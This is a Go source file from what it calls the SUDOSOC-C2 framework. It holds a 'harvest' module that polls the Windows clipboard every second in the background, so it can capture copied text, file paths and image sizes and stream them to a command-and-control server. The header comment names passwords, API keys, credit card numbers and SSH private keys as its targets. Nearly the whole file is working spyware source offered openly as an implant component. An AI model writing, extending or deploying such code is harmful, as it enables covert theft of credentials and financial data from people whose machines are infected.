package harvest

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  Seif

	Clipboard monitor — captures text, files, and images from the clipboard.

	Users routinely copy-paste passwords, API keys, credit card numbers,
	and SSH private keys. This monitor runs in a background goroutine,
	polling the clipboard every second and returning new content when it
	changes. Results are sent over a channel so the caller can stream them
	to the C2.
*/

import (
	"context"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

// ClipboardEntry is one clipboard capture event.
type ClipboardEntry struct {
	CapturedAt time.Time
	Format     string // "text", "file", "image"
	Text       string // populated for "text" format
	FilePaths  []string // populated for "file" format
	ImageSize  int      // byte count for "image" format (data not stored)
}

var (
	modUser32Clip         = windows.NewLazySystemDLL("user32.dll")
	procOpenClipboard     = modUser32Clip.NewProc("OpenClipboard")
	procCloseClipboard    = modUser32Clip.NewProc("CloseClipboard")
	procGetClipboardData  = modUser32Clip.NewProc("GetClipboardData")
	procIsClipboardFmtAvail = modUser32Clip.NewProc("IsClipboardFormatAvailable")

	modKernel32Clip   = windows.NewLazySystemDLL("kernel32.dll")
	procGlobalLock    = modKernel32Clip.NewProc("GlobalLock")
	procGlobalUnlock  = modKernel32Clip.NewProc("GlobalUnlock")
	procGlobalSize    = modKernel32Clip.NewProc("GlobalSize")
)

const (
	cfUnicodeText = 13
	cfHDrop       = 15
	cfDIBV5       = 17
)

// MonitorClipboard starts a background goroutine that polls the clipboard
// every pollInterval and sends new entries to the returned channel.
// Cancel ctx to stop monitoring. The channel is closed when monitoring ends.
func MonitorClipboard(ctx context.Context, pollInterval time.Duration) <-chan ClipboardEntry {
	if pollInterval == 0 {
		pollInterval = time.Second
	}
	ch := make(chan ClipboardEntry, 16)

	go func() {
		defer close(ch)
		var lastText string
		ticker := time.NewTicker(pollInterval)
		defer ticker.Stop()

		for {
			select {
			case <-ctx.Done():
				return
			case <-ticker.C:
				entry := readClipboard()
				if entry == nil {
					continue
				}
				// Deduplicate text entries.
				if entry.Format == "text" {
					if entry.Text == lastText {
						continue
					}
					lastText = entry.Text
				}
				select {
				case ch <- *entry:
				default:
				}
			}
		}
	}()

	return ch
}

// ReadClipboardOnce captures the current clipboard contents once.
func ReadClipboardOnce() *ClipboardEntry {
	return readClipboard()
}

func readClipboard() *ClipboardEntry {
	if r, _, _ := procOpenClipboard.Call(0); r == 0 {
		return nil
	}
	defer procCloseClipboard.Call()

	// Try Unicode text first.
	if r, _, _ := procIsClipboardFmtAvail.Call(cfUnicodeText); r != 0 {
		handle, _, _ := procGetClipboardData.Call(cfUnicodeText)
		if handle != 0 {
			ptr, _, _ := procGlobalLock.Call(handle)
			if ptr != 0 {
				text := windows.UTF16PtrToString((*uint16)(unsafe.Pointer(ptr)))
				procGlobalUnlock.Call(handle)
				if text != "" {
					return &ClipboardEntry{
						CapturedAt: time.Now(),
						Format:     "text",
						Text:       text,
					}
				}
			}
		}
	}

	// File drop list.
	if r, _, _ := procIsClipboardFmtAvail.Call(cfHDrop); r != 0 {
		handle, _, _ := procGetClipboardData.Call(cfHDrop)
		if handle != 0 {
			paths := extractFileDrop(handle)
			if len(paths) > 0 {
				return &ClipboardEntry{
					CapturedAt: time.Now(),
					Format:     "file",
					FilePaths:  paths,
				}
			}
		}
	}

	// DIB image — record size only (don't buffer potentially large images).
	if r, _, _ := procIsClipboardFmtAvail.Call(cfDIBV5); r != 0 {
		handle, _, _ := procGetClipboardData.Call(cfDIBV5)
		if handle != 0 {
			sz, _, _ := procGlobalSize.Call(handle)
			if sz > 0 {
				return &ClipboardEntry{
					CapturedAt: time.Now(),
					Format:     "image",
					ImageSize:  int(sz),
				}
			}
		}
	}

	return nil
}

var (
	procDragQueryFileW = windows.NewLazySystemDLL("shell32.dll").NewProc("DragQueryFileW")
)

func extractFileDrop(handle uintptr) []string {
	// DragQueryFile with index 0xFFFFFFFF returns the file count.
	count, _, _ := procDragQueryFileW.Call(handle, 0xFFFFFFFF, 0, 0)
	if count == 0 {
		return nil
	}
	paths := make([]string, 0, count)
	buf := make([]uint16, 260)
	for i := uintptr(0); i < count; i++ {
		n, _, _ := procDragQueryFileW.Call(handle, i,
			uintptr(unsafe.Pointer(&buf[0])), 260)
		if n > 0 {
			paths = append(paths, windows.UTF16ToString(buf[:n]))
		}
	}
	return paths
}
